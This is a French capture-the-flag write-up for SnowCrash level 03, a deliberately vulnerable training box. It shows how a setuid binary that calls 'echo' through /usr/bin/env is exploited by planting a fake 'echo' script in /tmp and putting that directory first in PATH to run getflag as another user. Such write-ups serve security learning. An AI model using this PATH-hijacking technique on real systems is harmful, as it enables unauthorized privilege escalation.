# Level 03

```bash
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

On voit qu'on a un fichier executable appertenant a l'utilisateur flag03 avec la permission 's' ce qui signifie qu'on la permission de l'executer en tant que user
level03.

Une fois executer on peut apercevoir ce message de la part de l'executable

```bash
level03@SnowCrash:~$ ./level03 
Exploit me
```

En utilisant la commande strings qui nous affiche les chaines de caractere presant dans un executable on voit la ligne '/usr/bin/env echo Exploit me'
```bash
level03@SnowCrash:~$ strings ./level03 | head -n30
/lib/ld-linux.so.2
KT{K
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh
UWVS
[^_]
/usr/bin/env echo Exploit me
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
/home/user/level03
/usr/include/i386-linux-gnu/bits
/usr/include/i386-linux-gnu/sys
level03.c
types.h
types.h
long long int
__uid_t
envp
/home/user/level03/level03.c
long long unsigned int
setresuid
```

En utilisant la technique de Path injection en forcant notre programme echo personnaliser etre executer avant le echo situe dans /usr/bin/ on peut executer les commandes qu'on souhaite

```bash
level03@SnowCrash:/tmp$ echo '#!/bin/bash' > echo
level03@SnowCrash:/tmp$ echo 'getflag' >> echo
level03@SnowCrash:/tmp$ chmod +x echo
level03@SnowCrash:/tmp$ export PATH=/tmp:$PATH
```
```bash
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : ***************
```